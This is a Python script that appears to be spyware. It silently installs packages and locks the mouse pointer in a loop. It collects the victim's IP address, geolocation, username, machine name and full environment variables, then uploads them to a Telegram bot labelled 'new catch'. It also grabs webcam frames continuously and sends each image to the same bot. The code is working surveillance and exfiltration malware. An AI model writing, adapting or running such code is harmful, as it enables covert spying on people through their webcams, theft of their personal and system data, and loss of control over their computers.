import os
try:
    import requests
    import socket
    import cv2
    import pyautogui
    #import keyboard
    import threading
except:
    os.system('pip install requests')
    os.system('pip install socket')
    os.system('pip install pyautogui')
    #os.system('pip install keyboard')
    os.system('pip install threading')
    os.system('pip install opencv-python')
id = ''#telegram channel id
token = ''#telegram bot token
error, x, ver, ip, img_counter = 0, '', '', '', 0
def m():
    error = 0
    try:
        while True:
            try:
#                if keyboard.is_pressed('k'):
#                    break
                pyautogui.moveTo(0, 0)
            except:
                ''
    except:
        error += 1
def info(x, error):
        try:
            threading.Thread(target=m).start()
            try:
                hostname = socket.gethostname()
                private_ip = socket.gethostbyname(hostname)
                x += f'\nprivate ip: {private_ip}'
            except:
                x += '\nprivate ip not found'
                error += 1
            try:
                gip = requests.get('https://api.ipify.org').text
                ip = requests.get(f'http://ip-api.com/json/{gip}')
                ver = True
                x += f'\nip: {gip}'
                x += '\nip info'
                x += '\n-----'
                try:
                    region = ip.json()['region']
                    x += f'\nip region: {region}'
                except:
                    x += '\nip region not found'
                    error += 1
                try:
                    regionname = ip.json()['regionName']
                    x += f'\nip region name: {regionname}'
                except:
                    x += '\nregion name not found'
                    error += 1
                try:
                    country = ip.json()['country']
                    x += f'\nip country: {country}'
                except:
                    x += '\n country not found'
                    error += 1
                x += '\n-----'
            except:
                x += '\nip not found'
                error += 1
            x += '\nDevice info'
            x += '\n-----'
            try:
                x += f"\ndevice user: {os.environ['USERNAME']}"
            except:
                x += '\ndevice user not found'
                error += 1
            try:
                x += f"\ndevice name: {os.environ['computername']}"
            except:
                x += '\ndevice name not found'
                error += 1
            try:
                x += f'\npath: {os.getcwd()}'
            except:
                x += '\npath not found'
                error += 1
            try:
                x += '\n-----'
                f = open('new-catch.txt', 'w+')
                f.write(str(x))
                s = open('new-catch.txt', 'rb')
                files = {'document': s}
                f.close()
                url = 'https://api.telegram.org/bot' + token + '/sendDocument?chat_id=' + id + '&caption=new catch'
                r = requests.post(url, files=files)
                s.close()
                os.remove('new-catch.txt')
                try:

                    if ver == True:
                        pack = open('packed-info.txt', 'w+')
                        pack.write('json ip infi:\n' + str(ip.json()) + 'device info:\n' + str(os.environ))
                        pack.close()
                        sp = open('packed-info.txt', 'rb')
                        files = {'document': sp}
                        url = 'https://api.telegram.org/bot' + token + '/sendDocument?chat_id=' + id
                        r = requests.post(url, files=files)
                        sp.close()
                        os.remove('packed-info.txt')
                except:
                    url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + id + '&text=packing error'
                    requests.get(url)
                    error += 1
            except:
                error += 1
        except:
            url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + id + '&text=failed to send new catch'
            requests.get(url)
            error += 1
            error += 1
def cam(img_counter, error):
    cam = cv2.VideoCapture(0)
    try:
        while True:
            ret, frame = cam.read()
            img_counter += 1
            img_name = "opencv_frame_{}.png".format(img_counter)
            cv2.imwrite(img_name, frame)
            K = open(f'opencv_frame_{img_counter}.png', 'rb')
            files = {'photo': K}
            def send_cam():
                url = 'https://api.telegram.org/bot' + token + '/sendPhoto?chat_id=' + id
                requests.post(url, files=files)
            threading.Thread(target=send_cam()).start()
            K.close()
            os.remove(img_name)
    except:
        url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + id + '&text=failed to send new catch photo'
        requests.get(url)
        error += 1
try:
    threading.Thread(target=m).start()
    threading.Thread(target=info, args=(x, error)).start()
    threading.Thread(target=cam, args=(img_counter, error)).start()
except:
    error += 1
